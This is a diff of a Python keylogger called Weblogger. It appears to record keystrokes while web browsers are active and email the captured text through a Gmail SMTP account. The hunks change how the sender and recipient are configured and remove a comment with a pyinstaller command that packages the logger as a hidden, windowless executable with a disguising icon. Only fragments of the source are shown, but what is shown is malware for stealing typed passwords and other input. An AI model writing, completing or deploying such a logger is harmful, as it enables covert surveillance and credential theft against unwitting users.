@@ -13,7 +13,7 @@ import subprocess
 
 class Weblogger(object):
     BROWSERS = ['google chrome', 'mozilla firefox', 'microsoft edge', 'safari', 'internet explorer']
-    GMAIL_DATA = {'user': '', 'passwd': '', 'email': ''}
+    GMAIL_DATA = {'user': '', 'passwd': ''}
     MAX_DATA_LEN = 500
     LOGGING = False
     IGNORE_HOLD = [Key.alt, Key.alt_l, Key.alt_r, Key.alt_gr,
@@ -149,7 +149,7 @@ class Weblogger(object):
         from email.mime.text import MIMEText
         import smtplib
 
-        email_from = self.GMAIL_DATA['email']
+        email_from = "%s@gmail.com" % self.GMAIL_DATA['user']
         text = self.translate_shift_key(text)
 
         msg = MIMEMultipart()
@@ -245,7 +245,7 @@ class Weblogger(object):
 
 
 if __name__ == '__main__':
-    wl = Weblogger()
+    wl = Weblogger(email_to="")
     signal.signal(signal.SIGTERM, wl.kill)
     signal.signal(signal.SIGINT, wl.kill)
     signal.signal(signal.SIGILL, wl.kill)
@@ -258,6 +258,3 @@ if __name__ == '__main__':
             wl.start_logging()
 
         sleep(1)
-
-# DEPLOY
-# python pyinstaller.py --onefile --noconsole --ico=anyimage.ico weblogger.py
